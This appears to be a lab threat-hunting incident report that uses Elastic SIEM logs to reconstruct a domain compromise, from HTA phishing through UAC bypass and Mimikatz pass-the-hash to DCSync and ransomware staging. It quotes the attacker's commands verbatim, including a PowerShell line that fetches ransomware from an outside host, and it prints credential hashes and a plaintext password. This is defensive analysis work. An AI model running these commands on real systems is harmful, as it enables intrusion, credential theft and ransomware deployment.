# Incident Report: The Boogeyman 3 – Enterprise Breach, Lateral Movement, DCSync & Ransomware Triage (Elastic SIEM)

| Metadata | Details |
| :--- | :--- |
| **Date** | October 2026 |
| **Analyst** | Piotr Asyngier |
| **SIEM / Tools Used** | Elastic Stack (Kibana / Winlogbeat / Sysmon) |
| **Category** | Enterprise Threat Hunting, Lateral Movement & Active Directory Compromise |
| **Threat Actor / Group** | Boogeyman |
| **Affected Environment** | Domain: `quicklogistics.org` (`WKSTN-0011` / CEO `evan.hutchinson`, `WKSTN-1327`, Domain Controller) |

---

## 1. Executive Summary
Following an initial foothold inside **Quick Logistics LLC**, the **Boogeyman** threat group launched an internal spearphishing attack from the compromised email account of Chief Finance Officer Allie Sierra (`allie.sierra@quicklogistics.org`) targeting the company's CEO, **Evan Hutchinson** (`QUICKLOGISTICS\evan.hutchinson`). The email delivered a malicious ISO optical disc image (`ProjectFinancialSummary_Q3.pdf.iso`) containing an HTML Application dropper (`ProjectFinancialSummary_Q3.pdf.hta`) and a hidden DLL payload (`review.dat`).

Threat hunting across Windows Event and Sysmon telemetry in **Elastic SIEM (Kibana)** reconstructed a full domain compromise kill chain:
1. Execution of the HTA payload via `mshta.exe` (`PID: 6392`), staging of `review.dat` via `xcopy.exe` (`PID: 2852`), C2 initialization via `rundll32.exe` (`165.232.170[.]151:80`), and scheduled task persistence (`Review`).
2. Local privilege escalation (UAC Bypass) abusing `fodhelper.exe` (`PID: 5388` / `5160`), followed by downloading **Mimikatz** (`mimi.zip`) to harvest NTLM hashes (`itadmin`).
3. Pass-the-Hash lateral authentication and SMB share enumeration (`PowerView.ps1`), uncovering hardcoded credentials (`QUICKLOGISTICS\allan.smith:Tr!ckyP@ssw0rd987`) inside `\\WKSTN-1327.quicklogistics.org\ITFiles\IT_Automation.ps1`.
4. Lateral movement to `WKSTN-1327` via PowerShell Remoting (`wsmprovhost.exe`), dumping the Domain Administrator NTLM hash (`administrator`), executing a **DCSync** attack against the domain (`backupda`), and staging the `ransomboogey.exe` ransomware binary across endpoints.

<img width="1438" height="597" alt="obraz" src="https://github.com/user-attachments/assets/a5ec4710-ad6c-4672-8a0a-c16e6f16cd02" />

<img width="2246" height="846" alt="obraz" src="https://github.com/user-attachments/assets/e9a4e31f-d235-4d1c-9146-5eea538516cc" />


---

## 2. Initial Access, Execution & Persistence (`WKSTN-0011`)

### 2.1. ISO Mounting & Stage-1 HTA Execution (`mshta.exe`)
When Evan Hutchinson opened the downloaded attachment (`ProjectFinancialSummary_Q3.pdf`, Type: `Disc Image File`, `2,208 KB`), Windows mounted it as a virtual DVD drive (`D:\`) exposing `ProjectFinancialSummary_Q3.pdf.hta` (`HTML Application`).

To identify the initial execution in **Elastic Kibana**, Sysmon Process Creation logs (`event.code: 1`) were filtered for common script/payload interpreters:
- **KQL Query:** `event.code: 1 AND process.name: ("wscript.exe" OR "cscript.exe" OR "powershell.exe" OR "cmd.exe" OR "mshta.exe")`
- **Stage-1 Process:** **`mshta.exe`** (**`PID: 6392`**, `Parent: explorer.exe`) executed at `Aug 29, 2023 @ 23:51:15.156`:
  * **Command Line:** `"C:\Windows\SysWOW64\mshta.exe" "D:\ProjectFinancialSummary_Q3.pdf.hta" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}`

<img width="1510" height="200" alt="obraz" src="https://github.com/user-attachments/assets/2141bbde-5113-4038-95e0-35bc4a284455" />


---

### 2.2. Payload Implanting (`xcopy.exe`), Execution (`rundll32.exe`) & Persistence (`Review`)
Filtering Elastic telemetry for child processes spawned by `mshta.exe` revealed the automated staging and persistence chain:
- **KQL Query:** `process.parent.pid: 6392`

1. **Payload Implanting (`23:51:15.728` – `PID: 2852`):**
   * The script used `xcopy.exe` to copy a hidden file (`review.dat`) from the mounted ISO (`D:\`) into the user's temporary directory:
   * **Command Line:** `"C:\Windows\System32\xcopy.exe" /s /i /e /h D:\review.dat C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat`
2. **Stage-1 DLL Execution (`23:51:16.711` – `PID: 3600`):**
   * Immediately after copying, `mshta.exe` invoked `rundll32.exe` to execute the `DllRegisterServer` export function of `review.dat`:
   * **Command Line:** `"C:\Windows\System32\rundll32.exe" D:\review.dat,DllRegisterServer`
3. **Scheduled Task Persistence (`23:51:16.899` – `PID: 4204`):**
   * A child `powershell.exe` process registered a daily scheduled task named **`Review`** (triggering daily at `06:00`) to execute the implanted `Temp\review.dat` file via `rundll32.exe`:
   * **Command Line:** `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" $A = New-ScheduledTaskAction -Execute 'rundll32.exe' -Argument 'C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat,DllRegisterServer'; $T = New-ScheduledTaskTrigger -Daily -At 06:00; $S = New-ScheduledTaskSettingsSet; $P = New-ScheduledTaskPrincipal $env:username; $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S; Register-ScheduledTask Review -InputObject $D -Force;`

<img width="1854" height="620" alt="obraz" src="https://github.com/user-attachments/assets/541a2e6e-f79d-4051-ae9e-2353bd728fab" />


---

## 3. C2 Communication, Privilege Escalation & Credential Harvesting

### 3.1. C2 Channel Initialization (`rundll32.exe`)
Correlating Sysmon Network Connection events (`event.code: 3`) immediately following the `rundll32.exe` execution (`Aug 29, 2023 @ 23:51:00.0` to `23:55:00.0`) exposed persistent C2 beaconing:
- **KQL Query:** `event.code: 3` (Timeframe: `Aug 29, 2023 23:51:00` – `23:55:00`)
- **Findings:** Process `rundll32.exe` (`PID: 4672`) generated 207 network connection events directed at external C2 IP **`165.232.170[.]151`** over port **`80`** (**`165.232.170.151:80`**).

<img width="1854" height="915" alt="obraz" src="https://github.com/user-attachments/assets/9041411f-eab0-4ff2-9ed9-f908145f53b1" />


---

### 3.2. Privilege Escalation via UAC Bypass (`fodhelper.exe`)
Inspecting process creation logs (`event.code: 1`) within the same `23:51:00` – `23:55:00` window showed the attacker enumerating local group memberships (`whoami.exe /groups`, `net.exe localgroup administrators`) and confirming that `evan.hutchinson` was a local administrator.
- **UAC Bypass Mechanism:** At `23:54:49`, `rundll32.exe` spawned the trusted auto-elevating Windows binary **`fodhelper.exe`** (`C:\Windows\System32\fodhelper.exe`, `PID: 5388` & `5160`).
- **Elevated Shell:** `fodhelper.exe` immediately spawned an administrative `powershell.exe` (`PID: 7716`) reading a registry command payload from `HKCU:\Software\Microsoft\Windows Update\update`.

<img width="1854" height="915" alt="obraz" src="https://github.com/user-attachments/assets/1f43f154-9b39-425c-8d65-f76abae98bd3" />


---

### 3.3. Credential Dumping (`Mimikatz`) & Pass-the-Hash (`itadmin`)
With high-integrity administrative access established, the attacker downloaded a credential dumping utility from GitHub and extracted local NTLM hashes:

1. **Tool Download (`Aug 30, 2023 @ 00:09:57.186`):**
   * **KQL Query:** `"github.com"`
   * **Executed Command (`PID: 6968`):** `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "iwr https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -outfile mimi.zip"` (subsequently unpacked via `Expand-Archive mimi.zip`).
2. **Pass-the-Hash Execution (`Aug 30, 2023 @ 00:13:27.090`):**
   * **KQL Query:** `event.code: 1 AND process.command_line: *ntlm*`
   * **Executed Command (`PID: 1892`):** `"C:\Windows\Temp\m\x64\mimi\x64\mimikatz.exe" "sekurlsa::pth /user:itadmin /domain:QUICKLOGISTICS /ntlm:F84769D250EB95EB2D7D8B4A1C5613F2 /run:powershell.exe" exit`
   * **Compromised Credential Pair #1:** **`itadmin:F84769D250EB95EB2D7D8B4A1C5613F2`**

<img width="1854" height="915" alt="obraz" src="https://github.com/user-attachments/assets/9538134f-209e-4bd2-82ed-543b4583abf6" />


<img width="1854" height="915" alt="obraz" src="https://github.com/user-attachments/assets/f267e116-3259-42ae-9c48-bb41b3148d1b" />


---

## 4. Network Share Enumeration & Lateral Movement (`WKSTN-1327`)

### 4.1. Remote Share Discovery & Hardcoded Credential Extraction (`IT_Automation.ps1`)
Operating inside the `itadmin` security context, the attacker loaded `PowerView.ps1` in memory (`Invoke-ShareFinder` at `00:14:36.078`) and enumerated remote SMB shares on host **`WKSTN-1327.quicklogistics.org`**:
- **Share Listing (`00:18:38.647`):** `ls FileSystem::\\WKSTN-1327.quicklogistics.org\ITFiles`
- **Accessed Remote File (`00:19:52.889` – `PID: 4820`):**
  * **Command Line:** `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "cat FileSystem::\\WKSTN-1327.quicklogistics.org\ITFiles\IT_Automation.ps1"`
  * **Target File Name:** **`IT_Automation.ps1`**
- **Discovered Plaintext Credentials (`00:20:23.384` – `PID: 7952`):**
  Inspecting the subsequent PowerShell command revealed plaintext credentials extracted from `IT_Automation.ps1` used to authenticate to **`WKSTN-1327`**:
  * **Command Line:** `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "$credential = (New-Object PSCredential -ArgumentList ('QUICKLOGISTICS\allan.smith', (ConvertTo-SecureString 'Tr!ckyP@ssw0rd987' -AsPlainText -Force))); Invoke-Command -Credential $credential -ComputerName WKSTN-1327 -ScriptBlock {whoami}"`
  * **Compromised Credential Pair #2:** **`QUICKLOGISTICS\allan.smith:Tr!ckyP@ssw0rd987`**
  * **Lateral Movement Target Hostname:** **`WKSTN-1327`**

<img width="1155" height="610" alt="obraz" src="https://github.com/user-attachments/assets/9b957aa7-63a6-4829-bc38-e50e66886a44" />

<img width="1516" height="768" alt="obraz" src="https://github.com/user-attachments/assets/e454dd36-92b0-40e0-86ba-aee5ffcbc9c9" />


---

### 4.2. WinRM Execution & Domain Admin Credential Dumping on `WKSTN-1327`
Filtering telemetry specifically for the second compromised workstation exposed the remote execution mechanism and subsequent credential theft:
- **KQL Query:** `event.code: 1 AND host.hostname: WKSTN-1327`
- **Parent Process on Target Host (`01:30:01.404`):** Because the attacker moved laterally via `Invoke-Command` (PowerShell Remoting / WinRM), the encoded `powershell.exe` payload (`PID: 4128`) on `WKSTN-1327` was spawned by parent process **`wsmprovhost.exe`** (`C:\Windows\System32\wsmprovhost.exe -Embedding`).
- **Dumping Domain Admin Credentials on `WKSTN-1327` (`01:37:28.246` – `PID: 6228`):**
  Re-running `event.code: 1 AND process.command_line: *ntlm*` revealed the attacker executing Mimikatz from `C:\Users\allan.smith\Documents\mimi\x64\mimikatz.exe` to perform Pass-the-Hash with a newly harvested Domain Administrator hash:
  * **Command Line:** `"C:\Users\allan.smith\Documents\mimi\x64\mimikatz.exe" "sekurlsa::pth /user:administrator /domain:QUICKLOGISTICS /ntlm:00f80f2538dcb54e7adc715c0e7091ec /run:powershell.exe" exit`
  * **Compromised Credential Pair #3:** **`administrator:00f80f2538dcb54e7adc715c0e7091ec`**

<img width="1851" height="867" alt="obraz" src="https://github.com/user-attachments/assets/14ef0200-c6e7-495b-b2c4-dd6a21191961" />


<img width="1851" height="867" alt="obraz" src="https://github.com/user-attachments/assets/a840c088-6885-453a-9fa3-512066bb23f3" />


---

## 5. Domain Dominance (DCSync) & Ransomware Staging

### 5.1. Active Directory Replication Abuse (DCSync Attack)
After pivoting to the Domain Controller using the `administrator` hash, process creation telemetry (`event.code: 1` between `01:46:00` and `01:50:00` on Aug 30, 2023) captured the attacker executing a **DCSync** attack via Mimikatz to replicate credentials from Active Directory:
- **Executed Command (`01:47:57.908` – `PID: 8000`):** `"C:\Users\Administrator\Documents\mimi\x64\mimikatz.exe" "lsadump::dcsync /domain:quicklogistics.org /user:backupda" exit` (followed by `/user:administrator` at `01:48:04.117`).
- **Targeted Account (besides `administrator`):** **`backupda`**

<img width="1854" height="915" alt="obraz" src="https://github.com/user-attachments/assets/cc9631ef-e170-4743-892e-2bcdc3626a63" />


---

### 5.2. Ransomware Binary Delivery (`ransomboogey.exe`)
In the final phase of the intrusion (`Aug 30, 2023 @ 02:01:14.388`), the attacker used `Invoke-Command` to distribute a ransomware binary across the domain:
- **KQL Query:** `process.command_line: (*ransom* AND *http*)`
- **Executed Command:** `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c Invoke-Command -ComputerName WKSTN-0011.quicklogistics.org -ScriptBlock {iwr http://ff.sillytechninja.io/ransomboogey.exe -outfile C:\Users\evan.hutchinson\ransomboogey.exe;}`
- **Ransomware Staging URL (Defanged):** **`hxxp://ff.sillytechninja[.]io/ransomboogey.exe`**

<img width="1851" height="867" alt="obraz" src="https://github.com/user-attachments/assets/a283fff8-6bf6-4b80-8f09-67390c613b27" />


---

## 6. Consolidated Indicators of Compromise (IoCs)

| Indicator Type | Value (Defanged) | Context |
| :--- | :--- | :--- |
| **Internal Sender** | `allie.sierra@quicklogistics[.]org` | Compromised CFO account used for internal spearphishing |
| **File Artifact (ISO/HTA)** | `ProjectFinancialSummary_Q3.pdf.iso` / `.hta` | Mounted disc image and Stage-1 HTA dropper |
| **File Path (DLL)** | `C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat` | Implanted Stage-1 DLL executed via `rundll32.exe` |
| **Scheduled Task** | `Review` | Daily persistence task (`06:00`) on `WKSTN-0011` |
| **IPv4 / Port (C2)** | `165.232.170[.]151:80` | External C2 server contacted by `rundll32.exe` (`PID: 4672`) |
| **Tool URL** | `hxxps://github[.]com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip` | Mimikatz archive downloaded as `mimi.zip` |
| **URL (Ransomware)** | `hxxp://ff.sillytechninja[.]io/ransomboogey.exe` | Remote server hosting the `ransomboogey.exe` binary |
| **Compromised Accounts** | `evan.hutchinson`, `itadmin`, `allan.smith`, `administrator`, `backupda` | Domain accounts compromised via PtH, share enumeration & DCSync |

---

## 7. MITRE ATT&CK Mapping & Remediation

### MITRE ATT&CK Techniques
- **`T1566.001` & `T1553.005` – Spearphishing Attachment & Mark-of-the-Web Bypass:** Internal phishing delivering an `.iso` optical disc image containing `ProjectFinancialSummary_Q3.pdf.hta`.
- **`T1218.005` & `T1218.011` – System Binary Proxy Execution (`mshta.exe` & `rundll32.exe`):** Executing the `.hta` payload via `mshta.exe` and running `review.dat,DllRegisterServer` via `rundll32.exe`.
- **`T1548.002` – Abuse Elevation Control Mechanism: Bypass User Account Control:** Leveraging `fodhelper.exe` and `HKCU:\Software\Microsoft\Windows Update\update` to spawn an elevated PowerShell session.
- **`T1003.001` & `T1003.006` – OS Credential Dumping (LSASS Memory & DCSync):** Using `mimikatz.exe` to extract NTLM hashes (`itadmin`, `administrator`) and perform `lsadump::dcsync` against `quicklogistics.org` (`backupda`).
- **`T1550.002` & `T1021.006` – Pass the Hash & Windows Remote Management (WinRM):** Lateral movement to `WKSTN-1327` via `sekurlsa::pth` and `Invoke-Command` (`wsmprovhost.exe`).
- **`T1486` – Data Encrypted for Impact:** Staging `ransomboogey.exe` via `Invoke-Command` across domain endpoints.

### Recommended Remediation Actions
1. **Enterprise Containment & Isolation:** Immediately isolate `WKSTN-0011`, `WKSTN-1327`, and the Domain Controller from the network. Block outbound traffic to C2 IP `165.232.170.151` and domain `ff.sillytechninja.io` at the perimeter firewall.
2. **Active Directory & Credential Reset (KRBTGT):** Because the attacker achieved Domain Admin privileges and executed a **DCSync** attack (`lsadump::dcsync`), perform a double reset of the `krbtgt` account password, rotate passwords/hashes for `administrator`, `backupda`, `itadmin`, `allan.smith`, `evan.hutchinson`, and `allie.sierra`, and remove plaintext credentials from `\\WKSTN-1327\ITFiles\IT_Automation.ps1`.
3. **Eradication & Hardening:** Remove the `Review` scheduled task (`Unregister-ScheduledTask -TaskName Review`), delete `review.dat`, `mimi.zip`, and `C:\Users\evan.hutchinson\ransomboogey.exe`, disable default mounting of `.iso` files via GPO, and enforce `Credential Guard` + Protected Users security group membership for privileged accounts.
